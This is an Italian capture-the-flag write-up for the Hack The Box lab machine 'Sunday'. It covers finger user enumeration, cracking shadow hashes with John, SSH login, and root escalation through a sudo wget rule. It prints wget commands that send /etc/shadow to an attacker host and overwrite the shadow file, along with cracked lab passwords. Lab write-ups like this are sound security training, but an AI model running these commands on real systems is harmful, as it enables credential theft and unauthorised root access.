<!DOCTYPE html>
<head>
<title> HTB - Sunday </title>
<meta name="viewport" content="width=device-width, initial-scale=1"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="generator" content="Org-mode"><meta name="author" content="Leonardo Tamiano">
<link href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.5/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/tonsky/FiraCode@5.2/distr/fira_code.css">
<link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
<style>
    .theme-light {
	--color-primary: black;
	--color-background: white;
	--color-text: black;
    }

    .theme-dark {
	--color-primary: #EE72F1;
	--color-background: #21202C;
	--color-text: white;
    }
    
    body {
	font-family: 'Fira Code', monospace;
	font-size: 20px;
	background-color: var(--color-background);
    }

    div#menu {
	position: sticky;
	position: -webkit-sticky;
	top: 5px;
	z-index: 30;
    }

    div#menu button {
	right: 0px;
	position: absolute;
    }

    p {
	color: var(--color-text);
    }

    h1, h2, h3, h4, h5, a {
	color: var(--color-primary);
    }

    nav a {
	color: var(--color-text);
    }

    nav a:hover {
	color: var(--color-primary);
	text-decoration: none;
    }

    ul li, ol li {
	color: var(--color-primary);
    }

    .collapsible {
	background-color: var(--color-background);
	border: none;
	text-align: left;
    }
    
    .top-buffer { margin-top: 18px; }

    figcaption { font-size: 15px; }

    footer { text-align: center; }

    .observation {
	border-style: solid;
	margin-top: 20px;
	margin-bottom: 20px;
    }

    pre {
	font-size: 20px;
	background-color: black;
	color: white;
	inline-size: 900px;
	overflow: auto;
	word-wrap: normal;
    }

    blockquote {
	border-left: 5px solid var(--color-primary);
    }

    blockquote p {
	color: var(--color-text);
    }

    /* side-menu stuff */
    .side-menu {
	position: fixed;
	left: 0;
	width: 60px;
	height: 100%;
	z-index: 100;
    }

    .side-menu-content {
	display: none;
	position: absolute;
	top: 60px;
	left: 0px;
	height: 100%;
	/* background-color: var(--color-primary); */
	z-index: 100;	
    }

    .side-menu-content ul {
	list-style-type: none;
	position: relative;
	margin-left: 5px;
	width: 100%;
	padding-left: 0px;
    }

    .side-menu-content ul li {
	position: relative;
	padding-top: 5px;
	font-size: 15px;
	padding-left: 0px;
    }

    .side-menu-content ul li a {
	color: var(--color-primary);
	text-decoration: none;
	font-weight: bold;
    }

    .toggle {
	position: absolute;
	display: block;
	top: 0;
	left: 0;
	width: 80px;
	height: 60px;
	background: var(--color-background);
    }

    .toggle:hover {
	background: var(--color-primary);
    }

    .toggle:before {
	content: '\f0c9';
	font-family: fontAwesome;
	position: absolute;
	width: 100%;
	height: 100%;
	line-height: 60px;
	text-align: center;
	font-size: 24px;
	color: var(--color-text);
    }

    @media (max-width: 576px) {
	* {
	    font-size: 10px;
	}

	h1 {
	    font-size: 13px;
	}

	h2, h3, h4, h5 {
	    font-size: 12px;
	}

	blockquote {
	    font-size: 15px;
	}

	pre {
	    font-size: 10px;
	    color: white;
	    inline-size: 300px;
	    word-wrap: normal;
	    overflow: auto;
	}

	.toggle {
	    width: 30px;
	}

	.toggle:before {
	    content: '\f0c9';
	    font-family: fontAwesome;
	    position: absolute;
	    width: 100%;
	    height: 100%;
	    line-height: 60px;
	    text-align: center;
	    font-size: 12px;
	    color: var(--color-text);
	}	
    }
</style>

<script type="text/x-mathjax-config">
MathJax.Hub.Config({
  displayAlign: "center",
  displayIndent: "2em",
  messageStyle: "none",
  "HTML-CSS": {
    scale: 100,
    styles: {
      ".MathJax_Display": {
        "font-size": "100%"
      }
    }
  },
  "SVG": {
    scale: 100,
    styles: {
      ".MathJax_SVG_Display": {
        "font-size": "100%",
        "margin-left": "-2.281em"
      }
    }
  }
});
</script>
<script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS_SVG"></script>
</head>
<body>
<div id="content" class="container">
<!-- Side menu stuff -->
    
    <div class="side-menu">
      <div class="toggle" onClick="toggleMenu()"></div>
      <div class="side-menu-content">
	<ul>
	  <li>
	    <a href="#">
	      <span class="icon"> </span>
	      <span class="title"> Collapse </span>
	    </a>
	  </li>
	  <li>
	    <a href="#">
	      <span class="icon"> </span>
	      <span class="title"> Expand </span>
	    </a>
	  </li>
	  
	  <li>
	    <a onClick="toggleTheme()">
	      <span class="icon"> </span>
	      <span class="title"> Theme </span>
	    </a>
	  </li>
	</ul>
      </div>
    </div>
<div class="row top-buffer"> </div>

<div class="row">
   <div class="col-xs-1"></div>
   <div class="col-xs-10"><h1 class="title">HTB - Sunday</h1>
   </div>
   <div class="col-xs-1"></div>
</div> <!-- end row -->
<div class="row">
   <div class="col-xs-1"></div>
   <div class="col-xs-10"><hr style="border: 1px solid #FFFFFF" />   </div>
   <div class="col-xs-1"></div>
</div> <!-- end row -->

<div class="row">
   <div class="col-xs-1"></div>
   <div class="col-xs-10"><div id="outline-container-sec-" class="outline-2"><button type="button" class="collapsible">
<h2 id="sec-" style="text-decoration: underline">  Basic Info &triangledown;</h2>
</button><div class='sec- collapsible-content'>
<ul class="org-ul">
<li><p>
<b>Default IP</b>: 10.10.10.76
</p>
</li>
<li><p>
<b>Video</b>: 
</p>
</li>
<li><p>
<b>Table of contents</b>:
</p>
<nav id="table-of-contents">
<div id="text-table-of-contents" class="bs-docs-sidebar">
<ul>
<li><a href="#sec-">Basic Info</a></li>
<li><a href="#sec-1">Enumeration</a>
<ul>
<li><a href="#sec-1-1">nmap</a></li>
<li><a href="#sec-1-2">finger</a></li>
<li><a href="#sec-1-3">john</a></li>
<li><a href="#sec-1-4">ssh</a></li>
<li><a href="#sec-1-5">unshadow</a></li>
<li><a href="#sec-1-6">wget</a></li>
</ul>
</li>
<li><a href="#sec-2">Walkthrough</a>
<ul>
<li><a href="#sec-2-1">Scan con nmap</a></li>
<li><a href="#sec-2-2">Enumerazione servizio finger</a></li>
<li><a href="#sec-2-3">Login con ssh</a></li>
<li><a href="#sec-2-4">User flag</a></li>
<li><a href="#sec-2-5">Root flag</a></li>
</ul>
</li>
<li><a href="#sec-3">Extra</a>
<ul>
<li><a href="#sec-3-1">Root flag tramite lo shadow file</a></li>
</ul>
</li>
</ul>
</div>
</nav>
</li>
</ul>
</div>
</div>
   </div>
   <div class="col-xs-1"></div>
</div> <!-- end row -->


<div class="row">
   <div class="col-xs-1"></div>
   <div class="col-xs-10"><div id="outline-container-sec-1" class="outline-2"><button type="button" class="collapsible">
<h2 id="sec-1" style="text-decoration: underline"> 1 Enumeration &triangledown;</h2>
</button><div id="outline-container-sec-1-1" class="outline-3"><button type="button" class="collapsible">
<h3 id="sec-1-1" nil> 1.1 nmap &triangledown;</h3>
</button><div id="outline-container-sec-1-1-1" class="outline-4"><button type="button" class="collapsible">
<h4 id="sec-1-1-1" nil> 1.1.1 leo@kali:~/repos/htb/machines/sunday$ nmap -sC -sV sunday &triangledown;</h4>
</button><div class='sec-1-1-1 collapsible-content'>
<pre class="example">
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-08 20:05 CEST
Nmap scan report for sunday (10.129.185.211)
Host is up (0.052s latency).
Not shown: 990 closed ports
PORT      STATE    SERVICE        VERSION
79/tcp    open     finger         Sun Solaris fingerd
|_finger: No one logged on\x0D
111/tcp   open     rpcbind        2-4 (RPC #100000)
1055/tcp  filtered ansyslmd
1090/tcp  filtered ff-fms
1863/tcp  filtered msnp
1998/tcp  filtered x25-svc-port
2875/tcp  filtered dxmessagebase2
5280/tcp  filtered xmpp-bosh
8009/tcp  filtered ajp13
50003/tcp filtered unknown
Service Info: OS: Solaris; CPE: cpe:/o:sun:sunos

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 457.94 seconds    
</pre>
</div>
</div>

<div id="outline-container-sec-1-1-2" class="outline-4"><button type="button" class="collapsible">
<h4 id="sec-1-1-2" nil> 1.1.2 leo@kali:~$ nmap -sC -sV -p 22022 sunday &triangledown;</h4>
</button><div class='sec-1-1-2 collapsible-content'>
<pre class="example">
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-08 22:41 CEST
Stats: 0:00:03 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.30% done; ETC: 22:41 (0:00:00 remaining)
Nmap scan report for sunday (10.129.185.230)
Host is up (0.052s latency).

PORT      STATE SERVICE VERSION
22022/tcp open  ssh     SunSSH 1.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 d2:e5:cb:bd:33:c7:01:31:0b:3c:63:d9:82:d9:f1:4e (DSA)
|_  1024 e4:2c:80:62:cf:15:17:79:ff:72:9d:df:8b:a6:c9:ac (RSA)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.37 seconds
</pre>
</div>
</div>

<div id="outline-container-sec-1-1-3" class="outline-4"><button type="button" class="collapsible">
<h4 id="sec-1-1-3" nil> 1.1.3 open ports &triangledown;</h4>
</button><div class='sec-1-1-3 collapsible-content'>
<pre class="example">
79/tcp    open     finger         Sun Solaris fingerd                                                  
|_finger: No one logged on\x0D
111/tcp   open     rpcbind        2-4 (RPC #100000)
22022/tcp open     ssh            SunSSH 1.3 (protocol 2.0)                                            
| ssh-hostkey:
|   1024 d2:e5:cb:bd:33:c7:01:31:0b:3c:63:d9:82:d9:f1:4e (DSA)                               
|_  1024 e4:2c:80:62:cf:15:17:79:ff:72:9d:df:8b:a6:c9:ac (RSA)                               
33967/tcp open     rpcbind
54979/tcp open     rpcbind
</pre>
</div>
</div>
</div>

<div id="outline-container-sec-1-2" class="outline-3"><button type="button" class="collapsible">
<h3 id="sec-1-2" nil> 1.2 finger &triangledown;</h3>
</button><div id="outline-container-sec-1-2-1" class="outline-4"><button type="button" class="collapsible">
<h4 id="sec-1-2-1" nil> 1.2.1 perl finger-user-enum.pl -U ~/repos/SecLists/Usernames/Names/names.txt -t sunday &triangledown;</h4>
</button><div class='sec-1-2-1 collapsible-content'>
<pre class="example">
Starting finger-user-enum v1.0 ( http://pentestmonkey.net/tools/finger-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Worker Processes ......... 5
Usernames file ........... /home/leo/repos/SecLists/Usernames/Names/names.txt
Target count ............. 1
Username count ........... 10177
Target TCP port .......... 79
Query timeout ............ 5 secs
Relay Server ............. Not used

######## Scan started at Sun Aug  8 20:28:41 2021 #########
admin@sunday: Login       Name               TTY         Idle    When    Where..adm      Admin      
                        &lt; .  .  .  . &gt;..lp       Line Printer Admin                 &lt; .  .  .  . &gt;..
uucp     uucp Admin                         &lt; .  .  .  . &gt;..nuucp    uucp Admin                     
    &lt; .  .  .  . &gt;..dladm    Datalink Admin                     &lt; .  .  .  . &gt;..listen   Network Adm
in                      &lt; .  .  .  . &gt;..
anne marie@sunday: Login       Name               TTY         Idle    When    Where..anne           
       ???..marie                 ???..
bin@sunday: bin             ???                         &lt; .  .  .  . &gt;..
a

dee dee@sunday: Login       Name               TTY         Idle    When    Where..dee                   ???..dee                   ???..
jo ann@sunday: Login       Name               TTY         Idle    When    Where..jo                    ???..ann                   ???..
la verne@sunday: Login       Name               TTY         Idle    When    Where..la                    ???..verne                 ???..
line@sunday: Login       Name               TTY         Idle    When    Where..lp       Line Printer Admin                 &lt; .  .  .  . &gt;..
message@sunday: Login       Name               TTY         Idle    When    Where..smmsp    SendMail Message Sub               &lt; .  .  .  . &gt;..
miof mela@sunday: Login       Name               TTY         Idle    When    Where..miof                  ???..mela                  ???..
root@sunday: root     Super-User            pts/3        &lt;Apr 24, 2018&gt; sunday              ..
sammy@sunday: sammy                 console      &lt;Oct 10, 2020&gt;..
sunny@sunday: sunny                 pts/3        &lt;Apr 24, 2018&gt; 10.10.14.4          ..
sys@sunday: sys             ???                         &lt; .  .  .  . &gt;..
zsa zsa@sunday: Login       Name               TTY         Idle    When    Where..zsa                   ???..zsa                   ???..
######## Scan completed at Sun Aug  8 20:59:46 2021 #########
14 results.  
</pre>

<p>
We find the following usernames
</p>

<pre class="example">
root@sunday
sammy@sunday
sunny@sunday
</pre>
</div>
</div>

<div id="outline-container-sec-1-2-2" class="outline-4"><button type="button" class="collapsible">
<h4 id="sec-1-2-2" nil> 1.2.2 finger -l root@sunday &triangledown;</h4>
</button><div class='sec-1-2-2 collapsible-content'>
<pre class="example">
finger -l root@sunday
Login name: root                        In real life: Super-User
Directory: /root                        Shell: /usr/bin/bash
Last login Tue Apr 24, 2018 on pts/3 from sunday
New mail received Tue Apr 24 11:05:47 2018;
  unread since Tue Apr 24 11:05:46 2018
No Plan.    
</pre>
</div>
</div>

<div id="outline-container-sec-1-2-3" class="outline-4"><button type="button" class="collapsible">
<h4 id="sec-1-2-3" nil> 1.2.3 leo@kali:~/repos/finger-user-enum$ finger -l sunny@sunday &triangledown;</h4>
</button><div class='sec-1-2-3 collapsible-content'>
<pre class="example">
Login name: sunny                       In real life: sunny
Directory: /export/home/sunny           Shell: /bin/bash
Last login Tue Apr 24, 2018 on pts/3 from 10.10.14.4
No unread mail
No Plan.    
</pre>
</div>
</div>

<div id="outline-container-sec-1-2-4" class="outline-4"><button type="button" class="collapsible">
<h4 id="sec-1-2-4" nil> 1.2.4 leo@kali:~/repos/finger-user-enum$ finger -l sammy@sunday &triangledown;</h4>
</button><div class='sec-1-2-4 collapsible-content'>
<pre class="example">
Login name: sammy                       In real life: sammy
Directory: /export/home/sammy           Shell: /bin/bash
Last login Sat Oct 10, 2020 on console
No unread mail
No Plan.    
</pre>
</div>
</div>
</div>

<div id="outline-container-sec-1-3" class="outline-3"><button type="button" class="collapsible">
<h3 id="sec-1-3" nil> 1.3 john &triangledown;</h3>
</button><div id="outline-container-sec-1-3-1" class="outline-4"><button type="button" class="collapsible">
<h4 id="sec-1-3-1" nil> 1.3.1 john --single unshadow &triangledown;</h4>
</button><div class='sec-1-3-1 collapsible-content'>
<pre class="example">
Warning: detected hash type "sha256crypt", but the string is also recognized as "crypt"      
Use the "--format=crypt" option to force loading these as that type instead                  
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha256crypt, crypt(3) $5$ [SHA256 128/128 AVX 4x])
Press 'q' or Ctrl-C to abort, almost any other key for status                                
0g 0:00:00:01 DONE (2018-05-16 12:15) 0g/s 1524p/s 1524c/s 1524C/s sunny1907..sunny1900      
Session completed
</pre>
</div>
</div>

<div id="outline-container-sec-1-3-2" class="outline-4"><button type="button" class="collapsible">
<h4 id="sec-1-3-2" nil> 1.3.2 john --wordlist=/usr/share/wordlists/rockyou.txt unshadow &triangledown;</h4>
</button><div class='sec-1-3-2 collapsible-content'>
<pre class="example">
leo@kali:~/repos/htb/machines/sunday/data$ john --wordlist=~/repos/wordlists/rockyou.txt unshadow 
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha256crypt, crypt(3) $5$ [SHA256 128/128 AVX 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sunday           (sunny)
cooldude!        (sammy)
2g 0:00:01:22 DONE (2021-08-08 22:58) 0.02431g/s 2477p/s 2508c/s 2508C/s daddyzgurl..chrystelle
Use the "--show" option to display all of the cracked passwords reliably
Session completed    
</pre>
</div>
</div>
</div>

<div id="outline-container-sec-1-4" class="outline-3"><button type="button" class="collapsible">
<h3 id="sec-1-4" nil> 1.4 ssh &triangledown;</h3>
</button><div id="outline-container-sec-1-4-1" class="outline-4"><button type="button" class="collapsible">
<h4 id="sec-1-4-1" nil> 1.4.1 leo@kali:~/repos/htb/machines/sunday$ ssh -p 22022 sunny@sunday &triangledown;</h4>
</button><div class='sec-1-4-1 collapsible-content'>
<pre class="example">
Unable to negotiate with 10.129.185.230 port 22022: no matching key exchange method found. Their offer: gss-group1-sha1-toWM5Slw5Ew8Mqkay+al2g==,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1
</pre>
</div>
</div>

<div id="outline-container-sec-1-4-2" class="outline-4"><button type="button" class="collapsible">
<h4 id="sec-1-4-2" nil> 1.4.2 ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -p 22022 sunny@sunday &triangledown;</h4>
</button><div class='sec-1-4-2 collapsible-content'>
<pre class="example">
The authenticity of host '[sunday]:22022 ([10.129.185.230]:22022)' can't be established.
RSA key fingerprint is SHA256:TmRO9yKIj8Rr/KJIZFXEVswWZB/hic/jAHr78xGp+YU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[sunday]:22022,[10.129.185.230]:22022' (RSA) to the list of known hosts.
Password: 
Last login: Tue Apr 24 10:48:11 2018 from 10.10.14.4
Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008
sunny@sunday:~$     
</pre>
</div>
</div>
</div>

<div id="outline-container-sec-1-5" class="outline-3"><button type="button" class="collapsible">
<h3 id="sec-1-5" nil> 1.5 unshadow &triangledown;</h3>
</button><div class='sec-1-5 collapsible-content'>
<div class="org-src-container">

<pre class="src src-sh">unshadow passwd_file shadow_file &gt; unshadow_file   
</pre>
</div>

<p>
Dove il file unshadow finale ha la seguente forma
</p>

<pre class="example">
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:101:10:sammy:/export/home/sammy:/bin/bash
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:65535:1:sunny:/export/home/sunny:/bin/bash
</pre>
</div>
</div>

<div id="outline-container-sec-1-6" class="outline-3"><button type="button" class="collapsible">
<h3 id="sec-1-6" nil> 1.6 wget &triangledown;</h3>
</button><div class='sec-1-6 collapsible-content'>
<p>
Per sovrascrivere un file qualsiasi
</p>
<div class="org-src-container">

<pre class="src src-sh">sudo /usr/bin/wget 10.10.14.96:1337/modified_shadow -O /etc/shadow   
</pre>
</div>

<p>
Per leggere un file qualsiasi
</p>
<div class="org-src-container">

<pre class="src src-sh">sudo /usr/bin/wget 10.10.14.96:1337/modified_shadow --post-file = /etc/shadow
</pre>
</div>
</div>
</div>
</div>
   </div>
   <div class="col-xs-1"></div>
</div> <!-- end row -->

<div class="row">
   <div class="col-xs-1"></div>
   <div class="col-xs-10"><div id="outline-container-sec-2" class="outline-2"><button type="button" class="collapsible">
<h2 id="sec-2" style="text-decoration: underline"> 2 Walkthrough &triangledown;</h2>
</button><div id="outline-container-sec-2-1" class="outline-3"><button type="button" class="collapsible">
<h3 id="sec-2-1" nil> 2.1 Scan con nmap &triangledown;</h3>
</button><div class='sec-2-1 collapsible-content'>
<p>
I soliti scans con nmap mostrano la seguente situazione
</p>

<p>
<b>nmap -sC -sV sunday</b>
</p>

<pre class="example">
PORT      STATE    SERVICE        VERSION
79/tcp    open     finger         Sun Solaris fingerd
|_finger: No one logged on\x0D
111/tcp   open     rpcbind        2-4 (RPC #100000)
1055/tcp  filtered ansyslmd
1090/tcp  filtered ff-fms
1863/tcp  filtered msnp
1998/tcp  filtered x25-svc-port
2875/tcp  filtered dxmessagebase2
5280/tcp  filtered xmpp-bosh
8009/tcp  filtered ajp13
50003/tcp filtered unknown
Service Info: OS: Solaris; CPE: cpe:/o:sun:sunos   
</pre>

<p>
<b>nmap -sC -sV -p 22022 sunday</b>
</p>

<pre class="example">
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-08 22:41 CEST
Stats: 0:00:03 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.30% done; ETC: 22:41 (0:00:00 remaining)
Nmap scan report for sunday (10.129.185.230)
Host is up (0.052s latency).

PORT      STATE SERVICE VERSION
22022/tcp open  ssh     SunSSH 1.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 d2:e5:cb:bd:33:c7:01:31:0b:3c:63:d9:82:d9:f1:4e (DSA)
|_  1024 e4:2c:80:62:cf:15:17:79:ff:72:9d:df:8b:a6:c9:ac (RSA)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.37 seconds
</pre>

<p>
Notiamo in particolare i seguenti servizi: 
</p>

<ul class="org-ul">
<li><p>
Nella porta \(79\) il servizio <code>finger</code>, che viene utilizzato per
ottenere varie informazioni basi sugli utenti del sistema.
</p>
</li>

<li><p>
Nella porta \(22022\) il solito servizio <code>ssh</code>.
</p>
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-2-2" class="outline-3"><button type="button" class="collapsible">
<h3 id="sec-2-2" nil> 2.2 Enumerazione servizio finger &triangledown;</h3>
</button><div class='sec-2-2 collapsible-content'>
<p>
Procediamo quindi enumerando gli utenti del sistema tramite il
servizio finger. Il servizio finger infatti ci permette di ottenere
delle informazioni sugli utenti.
</p>

<p>
Se ad esempio eseguiamo <code>finger -l root@sunday</code>, otteniamo il
seguente output
</p>

<pre class="example">
Login name: root                        In real life: Super-User
Directory: /root                        Shell: /usr/bin/bash
Last login Tue Apr 24, 2018 on pts/3 from sunday
New mail received Tue Apr 24 11:05:47 2018;
  unread since Tue Apr 24 11:05:46 2018
No Plan.
</pre>

<p>
che ci fa capire che l'utente <code>root</code> esiste nel sistema. 
</p>

<p>
Se invece proviamo ad eseguire lo stesso comando ma con un username
creato in modo randomico, ad esempio <code>finger -l asdasds@sunday</code>,
otteniamo quest'altro tipo di output
</p>

<pre class="example">
Login name: asadasds                    In real life: ???
</pre>

<p>
che ci fa capire che, a differenza di prima, l'utente <code>asdasds</code>,
giustamente, non esiste.
</p>

<hr >

<p>
Utilizzando questo tipo di output possiamo qundi discriminare se un
utente esiste oppure no. 
</p>

<p>
In particolare, tramite lo script <code>finger-user-enum</code>, disponibile
nella github repository di
<a href="https://github.com/pentestmonkey/finger-user-enum">https://github.com/pentestmonkey/finger-user-enum</a>, e la wordlist
<code>Usernames/Names/names.txt</code> disponibile nella github repository
<a href="https://github.com/danielmiessler/SecLists">SecLists</a> possiamo enumerare gli utenti del sistema.
</p>

<div class="org-src-container">

<pre class="src src-sh">perl finger-user-enum.pl -U ~/repos/SecLists/Usernames/Names/names.txt -t sunday   
</pre>
</div>

<p>
per ottenere il seguente output
</p>

<pre class="example">
root@sunday: root     Super-User            pts/3        &lt;Apr 24, 2018&gt; sunday
sammy@sunday: sammy                 console      &lt;Oct 10, 2020&gt;
sunny@sunday: sunny                 pts/3        &lt;Apr 24, 2018&gt; 10.10.14.4
</pre>

<p>
possiamo quindi inferire l'esistenza dei seguenti account nel sistema
</p>

<pre class="example">
root
sammy
sunny
</pre>
</div>
</div>

<div id="outline-container-sec-2-3" class="outline-3"><button type="button" class="collapsible">
<h3 id="sec-2-3" nil> 2.3 Login con ssh &triangledown;</h3>
</button><div class='sec-2-3 collapsible-content'>
<p>
Provando a fare il login con ssh nella porta \(22022\) otteniamo il
seguente errore
</p>

<div class="org-src-container">

<pre class="src src-sh">ssh -p 22022 sunny@sunday   
</pre>
</div>

<pre class="example">
Unable to negotiate with 10.129.185.230 port 22022:
   no matching key exchange method found.
Their offer: gss-group1-sha1-toWM5Slw5Ew8Mqkay+al2g==,
             diffie-hellman-group-exchange-sha1,
             diffie-hellman-group1-sha1   
</pre>

<p>
l'errore ci sta dicendo che tra il client ssh (nella nostra
macchina) e il servizio ssh (nella macchina remota) non è stato
trovato nessun cifrario comune, e quindi non è stato possibile
iniziare la comunicazione.
</p>

<p>
Per sistemare questo problema dobbiamo dire al client ssh, quello
eseguito sulla nostra macchina, di utilizzare uno dei cifrari
offerti dal server. Possiamo fare questo con il seguente comando
</p>

<div class="org-src-container">

<pre class="src src-sh">ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -p 22022 sunny@sunday   
</pre>
</div>

<p>
Una volta che siamo in grado di connetterci, possiamo entrare con
le seguenti credenziali:
</p>

<pre class="example">
sunny:sunday   
</pre>

<p>
notiamo che mentre l'username <code>sunny</code> è stato ottenuto enumerando il
servizio finger, per quanto riguarda la password, quest'ultima può
essere ottenuta sia andando a fare un attacco brute-force sul
login, oppure indovinandola, in quanto la password corrisponde al
nome della macchina.
</p>
</div>
</div>

<div id="outline-container-sec-2-4" class="outline-3"><button type="button" class="collapsible">
<h3 id="sec-2-4" nil> 2.4 User flag &triangledown;</h3>
</button><div class='sec-2-4 collapsible-content'>
<p>
Una volta dentro per prendere l'user flag dobbiamo andare nella
cartella <code>/backup</code> per vedere il file <code>shadow.backup</code>, che contiene,
come suggerisce il nome, il backup del file <code>/etc/shadow</code>.
</p>

<pre class="example">
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
</pre>

<p>
Per poter craccare le password andiamo prima a leggere il contenuto
del file <code>/etc/passwd</code> relativo agli utenti <code>sammy</code> e <code>sunny</code>
</p>

<pre class="example">
sammy:x:101:10:sammy:/export/home/sammy:/bin/bash
sunny:x:65535:1:sunny:/export/home/sunny:/bin/bash
</pre>

<p>
ed a eseguire il comando <code>unshadow</code> per collegare i due file in un
unico file
</p>

<div class="org-src-container">

<pre class="src src-sh">unshadow passwd_file shadow_file &gt; unshadow_file   
</pre>
</div>

<p>
Il contenuto di <code>unshadow_file</code> è il seguente
</p>

<pre class="example">
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:101:10:sammy:/export/home/sammy:/bin/bash
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:65535:1:sunny:/export/home/sunny:/bin/bash   
</pre>

<hr >

<p>
Alla fine possiamo utilizzare <code>john</code> con la solita wordlist
<code>rockyou.txt</code> per ottenere le password degli utenti
</p>

<div class="org-src-container">

<pre class="src src-sh">john --wordlist=/usr/share/wordlists/rockyou.txt unshadow   
</pre>
</div>

<p>
in questo caso otteniamo
</p>

<pre class="example">
sunday           (sunny)
cooldude!        (sammy)
</pre>

<hr >

<p>
Una volta loggati come l'utente <code>sammy</code> troviamo subito la user flag
nella sua home directory.
</p>
</div>
</div>

<div id="outline-container-sec-2-5" class="outline-3"><button type="button" class="collapsible">
<h3 id="sec-2-5" nil> 2.5 Root flag &triangledown;</h3>
</button><div class='sec-2-5 collapsible-content'>
<p>
Continuando come l'utente sammy eseguendo il comando <code>sudo -l</code>
troviamo la seguente situazione
</p>

<pre class="example">
User sammy may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/wget     
</pre>

<p>
Possiamo quindi eseguire il comando <code>wget</code> come root. 
</p>

<hr >

<p>
La prima idea è quella di far partire un python server e di
sovrascrivere il file <code>/root/.ssh/authorized_keys</code> per entrare in ssh
con il seguente comando
</p>

<div class="org-src-container">

<pre class="src src-sh">wget http://&lt;IP&gt;:&lt;port&gt;/authorized_keys -O /home/.ssh/authorized_keys
</pre>
</div>

<p>
questo però non funziona, probabilmente perché la cartella <code>.ssh</code> non
esiste.
</p>

<hr >

<p>
In realtà per ottenere una root da shell basta notare il fatto che
l'utente <code>sunny</code> può eseguire da root lo script <code>/root/troll</code>. L'idea
quindi è quella di sovrascivere questo script con uno script che
spawna una shell tramite wget, per poi eseguirlo.
</p>

<p>
Per far funzionare il tutto bisogna stare attenti al fatto che lo
script <code>troll</code> viene ogni tot. di secondi sovrascritto da un cronjob.
</p>

<hr >

<p>
Una volta ottenuto la shell da root possiamo semplicemente leggere
la root flag.
</p>
</div>
</div>
</div>
   </div>
   <div class="col-xs-1"></div>
</div> <!-- end row -->


<div class="row">
   <div class="col-xs-1"></div>
   <div class="col-xs-10"><div id="outline-container-sec-3" class="outline-2"><button type="button" class="collapsible">
<h2 id="sec-3" style="text-decoration: underline"> 3 Extra &triangledown;</h2>
</button><div id="outline-container-sec-3-1" class="outline-3"><button type="button" class="collapsible">
<h3 id="sec-3-1" nil> 3.1 Root flag tramite lo shadow file &triangledown;</h3>
</button><div class='sec-3-1 collapsible-content'>
<p>
Un altro modo per ottenere il root, che avrebbe funzionato anche se
non fossimo stati in grado di eseguire lo script <code>/root/troll</code>,
consiste nell'utilizzare il parametro <code>post-file</code> del comando <code>wget</code>
per leggere il file <code>/etc/shadow</code>. Per fare questo dobbiamo prima
settare nella nostra macchina un python server che semplicemente
logga le richieste GET/POST che riceve
</p>

<div class="org-src-container">

<pre class="src src-sh">python3 log_http_requests.py 1337   
</pre>
</div>

<p>
e poi nella macchina remota eseguire il seguente comando
</p>

<div class="org-src-container">

<pre class="src src-sh">sudo /usr/bin/wget 10.10.14.96:1337/modified_passwd --post-file=/etc/shadow   
</pre>
</div>

<p>
una volta che leggiamo il file shadow, che è il seguente
</p>

<pre class="example">
root:$5$WVmHMduo$nI.KTRbAaUv1ZgzaGiHhpA2RNdoo3aMDgPBL25FZcoD:14146::::::
&lt;ALTRE COSE QUI...&gt;
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::   
</pre>

<p>
semplicemente modificando lo shadow file andando a copiare la
password-hashata dell'utente sammy nell'utente root e trasportando
il file shadow modificato nella macchina remota come segue
</p>

<div class="org-src-container">

<pre class="src src-sh">wget http://&lt;IP&gt;:&lt;port&gt;/modified_shadow -O /etc/shadow
</pre>
</div>

<p>
siamo in grado di loggare come l'utente root utilizzando la
password dell'utente <code>sammy</code>, ovvero <code>cooldude!</code>.
</p>
</div>
</div>
</div>
   </div>
